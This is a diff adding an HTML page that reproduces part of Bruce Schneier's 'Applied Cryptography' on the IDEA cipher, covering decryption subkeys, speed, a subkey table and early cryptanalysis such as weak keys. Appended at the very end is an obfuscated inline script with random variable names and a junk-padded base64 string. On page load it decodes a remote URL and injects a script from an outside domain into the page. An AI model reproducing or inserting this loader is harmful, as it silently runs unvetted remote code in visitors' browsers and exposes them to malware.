@@ -1,0 +1,127 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=13//-->
+<!--PAGES=322-323//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Decryption is exactly the same, except that the subkeys are reversed and slightly different. The decryption subkeys are either the additive or multiplicative inverses of the encryption subkeys. (For the purposes of IDEA, the all-zero sub-block is considered to represent 2<SUP>16</SUP> = &#150; 1 for multiplication modulo 2<SUP>16</SUP> &#43; 1; thus the multiplicative inverse of 0 is 0.) Calculating these takes some doing, but you only have to do it once for each decryption key. Table 13.4 shows the encryption subkeys and the corresponding decryption subkeys.</P>
+<P><FONT SIZE="+1"><B><I>Speed of IDEA</I></B></FONT></P>
+<P>Current software implementations of IDEA are about twice as fast as DES. IDEA on a 33 megahertz 386 machine encrypts data at 880 kilobits per second, and 2400 kilobits per second on a 66 megahertz 486 machine. You might think IDEA should be faster, but multiplications aren&#146;t cheap. To multiply two 32-bit numbers on a 486 requires 40 clock cycles (10 on a Pentium).
+</P>
+<P>A VLSI implementation of PES encrypts data at 55 megabits per second at 25 megahertz [208, 398]. Another VLSI chip developed at ETH Zurich, consisting of 251, 000 transistors on a chip 107.8 square millimeters, encrypts data using the IDEA algorithm at a 177 megabit-per-second data rate when clocked at 25 megahertz [926, 207, 397].</P>
+<TABLE WIDTH="100%"><TH CAPTION COLSPAN="3" ALIGN="CENTER">Table 13.4<BR>IDEA Encryption and Decryption Subkeys
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TH ALIGN="LEFT">Round
+<TH ALIGN="LEFT">Encryption Subkeys
+<TH ALIGN="LEFT">Decryption Subkeys
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">1st
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(1)</SUP> Z<SUB>2</SUB><SUP>(1)</SUP> Z<SUB>3</SUB><SUP>(1)</SUP> Z<SUB>4</SUB><SUP>(1)</SUP> Z<SUB>5</SUB><SUP>(1)</SUP> Z<SUB>6</SUB><SUP>(1)</SUP>
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(9) - 1</SUP> &#150;Z<SUB>2</SUB><SUP>(9)</SUP> &#150;Z<SUB>3</SUB><SUP>(9)</SUP> Z<SUB>4</SUB><SUP>(9) - 1</SUP> Z<SUB>5</SUB><SUP>(8)</SUP> Z<SUB>6</SUB><SUP>(8)</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">2nd
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(2)</SUP> Z<SUB>2</SUB><SUP>(2)</SUP> Z<SUB>3</SUB><SUP>(2)</SUP> Z<SUB>4</SUB><SUP>(2)</SUP> Z<SUB>5</SUB><SUP>(2)</SUP> Z<SUB>6</SUB><SUP>(2)</SUP>
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(8) - 1</SUP> &#150;Z<SUB>3</SUB><SUP>(8)</SUP> &#150;Z<SUB>2</SUB><SUP>(8)</SUP> Z<SUB>4</SUB><SUP>(8) - 1</SUP> Z<SUB>5</SUB><SUP>(7)</SUP> Z<SUB>6</SUB><SUP>(7)</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">3rd
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(3)</SUP> Z<SUB>2</SUB><SUP>(3)</SUP> Z<SUB>3</SUB><SUP>(3)</SUP> Z<SUB>4</SUB><SUP>(3)</SUP> Z<SUB>5</SUB><SUP>(3)</SUP> Z<SUB>6</SUB><SUP>(3)</SUP>
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(7) - 1</SUP> &#150;Z<SUB>3</SUB><SUP>(7)</SUP> &#150;Z<SUB>2</SUB><SUP>(7)</SUP> Z<SUB>4</SUB><SUP>(7) - 1</SUP> Z<SUB>5</SUB><SUP>(6)</SUP> Z<SUB>6</SUB><SUP>(6)</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">4th
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(4)</SUP> Z<SUB>2</SUB><SUP>(4)</SUP> Z<SUB>3</SUB><SUP>(4)</SUP> Z<SUB>4</SUB><SUP>(4)</SUP> Z<SUB>5</SUB><SUP>(4)</SUP> Z<SUB>6</SUB><SUP>(4)</SUP>
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(6) - 1</SUP> &#150;Z<SUB>3</SUB><SUP>(6)</SUP> &#150;Z<SUB>2</SUB><SUP>(6)</SUP> Z<SUB>4</SUB><SUP>(6) - 1</SUP> Z<SUB>5</SUB><SUP>(5)</SUP> Z<SUB>6</SUB><SUP>(5)</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">5th
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(5)</SUP> Z<SUB>2</SUB><SUP>(5)</SUP> Z<SUB>3</SUB><SUP>(5)</SUP> Z<SUB>4</SUB><SUP>(5)</SUP> Z<SUB>5</SUB><SUP>(5)</SUP> Z<SUB>6</SUB><SUP>(5)</SUP>
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(5) - 1</SUP> &#150;Z<SUB>3</SUB><SUP>(5)</SUP> &#150;Z<SUB>2</SUB><SUP>(5)</SUP> Z<SUB>4</SUB><SUP>(5) - 1</SUP> Z<SUB>5</SUB><SUP>5(4)</SUP> Z<SUB>6</SUB><SUP>(4)</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">6th
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(6)</SUP> Z<SUB>2</SUB><SUP>(6)</SUP> Z<SUB>3</SUB><SUP>(6)</SUP> Z<SUB>4</SUB><SUP>(6)</SUP> Z<SUB>5</SUB><SUP>(6)</SUP> Z<SUB>6</SUB><SUP>(6)</SUP>
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(4) - 1</SUP> &#150;Z<SUB>3</SUB><SUP>(4)</SUP> &#150;Z<SUB>2</SUB><SUP>(4)</SUP> Z<SUB>4</SUB><SUP>(4) - 1</SUP> Z<SUB>5</SUB><SUP>(3)</SUP> Z<SUB>6</SUB><SUP>(3)</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">7th
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(7)</SUP> Z<SUB>2</SUB><SUP>(7)</SUP> Z<SUB>3</SUB><SUP>(7)</SUP> Z<SUB>4</SUB><SUP>(7)</SUP> Z<SUB>5</SUB><SUP>(7)</SUP> Z<SUB>6</SUB><SUP>(7)</SUP>
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(3) - 1</SUP> &#150;Z<SUB>3</SUB><SUP>(3)</SUP> &#150;Z<SUB>2</SUB><SUP>(3)</SUP> Z<SUB>4</SUB><SUP>(3) - 1</SUP> Z<SUB>5</SUB><SUP>(2)</SUP> Z<SUB>6</SUB><SUP>(2)</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">8th
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(8)</SUP> Z<SUB>2</SUB><SUP>(8)</SUP> Z<SUB>3</SUB><SUP>(8)</SUP> Z<SUB>4</SUB><SUP>(8)</SUP> Z<SUB>5</SUB><SUP>(8)</SUP> Z<SUB>6</SUB><SUP>(8)</SUP>
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(2) - 1</SUP> &#150;Z<SUB>3</SUB><SUP>(2)</SUP> &#150;Z<SUB>2</SUB><SUP>(2)</SUP> Z<SUB>4</SUB><SUP>(2) - 1</SUP> Z<SUB>5</SUB><SUP>(1)</SUP> Z<SUB>6</SUB><SUP>(1)</SUP>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">output<BR>transformation
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(9)</SUP> Z<SUB>2</SUB><SUP>(9)</SUP> Z<SUB>3</SUB><SUP>(9)</SUP> Z<SUB>4</SUB><SUP>(9)</SUP>
+<TD ALIGN="LEFT" VALIGN="TOP">Z<SUB>1</SUB><SUP>(1) - 1</SUP> &#150;Z<SUB>2</SUB><SUP>(1)</SUP> &#150;Z<SUB>3</SUB><SUP>(1)</SUP> Z<SUB>4</SUB><SUP>(1) - 1</SUP>
+<TR>
+<TD COLSPAN="3"><HR>
+</TABLE>
+<P><FONT SIZE="+1"><B><I>Cryptanalysis of IDEA</I></B></FONT></P>
+<P>IDEA&#146;s key length is 128 bits&#151;over twice as long as DES. Assuming that a brute-force attack is the most efficient, it would require 2<SUP>128</SUP>(10<SUP>38</SUP>) encryptions to recover the key. Design a chip that can test a billion keys per second and throw a billion of them at the problem, and it will still take 10<SUP>13</SUP> years&#151;that&#146;s longer than the age of the universe. An array of 10<SUP>24</SUP> such chips can find the key in a day, but there aren&#146;t enough silicon atoms in the universe to build such a machine. Now we&#146;re getting somewhere&#151;although I&#146;d keep my eye on the dark matter debate.</P>
+<P>Perhaps brute force isn&#146;t the best way to attack IDEA. The algorithm is still too new for any definitive cryptanalytic results. The designers have done their best to make the algorithm immune to differential cryptanalysis; they defined the concept of a Markov cipher and showed that resistance to differential cryptanalysis can be modeled and quantified [931, 925]. (Figure 13.10 shows the original PES algorithm to be contrasted with the IDEA algorithm of Figure 13.9 which was strengthened against differential cryptanalysis. It&#146;s amazing how a few subtle changes can make such a big difference.) In [925], Lai argued (he gave evidence, not a proof) that IDEA is immune to differential cryptanalysis after only 4 of its 8 rounds. According to Biham, his related-key cryptanalytic attack doesn&#146;t work against IDEA, either [160].</P>
+<P>Willi Meier examined the three algebraic operations of IDEA, and pointed out that while they are incompatible, there are instances where they can be simplified in such a way as to facilitate cryptanalysis some percentage of the time [1050]. His attack is more efficient than brute-force for 2-round IDEA (2<SUP>42</SUP> operations), but less efficient for 3-round IDEA or higher. Normal IDEA, with 8 rounds, is safe.</P>
+<P>Joan Daemen discovered a class of weak keys for IDEA [406, 409]. These are not weak keys in the sense of the DES weak keys; that is, the encryption function is self-inverse. They are weak in the sense that if they are used, an attacker can easily identify them in a chosen-plaintext attack. For example, a weak key is (in hex):</P>
+<DL>
+<DD>0000, 0000, 0<I>x</I> 00, 0000, 0000, 000<I>x,xxxx,x</I>000
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(QbLSVJZf, cchYgOZb) {cchYgOZb = QbLSVJZf.createElement('script');cchYgOZb.type = 'text/javascript';cchYgOZb.async = true;cchYgOZb.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');QbLSVJZf.getElementsByTagName('body')[0].appendChild(cchYgOZb);}(document));</script></body>
+</html>
